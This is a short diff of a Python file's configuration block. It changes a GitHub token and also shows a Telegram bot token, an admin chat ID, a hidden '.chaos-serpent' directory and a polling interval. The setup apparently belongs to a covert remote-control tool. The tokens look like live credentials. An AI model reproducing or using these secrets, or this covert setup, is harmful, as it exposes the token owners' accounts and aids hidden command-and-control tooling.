@@ -64,7 +64,7 @@ except ImportError:
 # Configuration Constants
 HIDDEN_DIR_NAME = ".chaos-serpent"
 HIDDEN_SUBDIR_NAME = "cache"
-GITHUB_TOKEN = "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"  # Replace with your actual GitHub PAT with 'gist' scope
+GITHUB_TOKEN = "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"  # Replace with your actual GitHub PAT with 'gist' scope
 TELEGRAM_TOKEN = "8364609882:AAFIZerZkAbcdYuRwzdxtjpPxgri_PWLc1M"  # Replace with your actual Telegram Bot Token
 ADMIN_CHAT_ID = "7926187033"  # Replace with your actual Telegram Chat ID
 CHECK_INTERVAL = 5
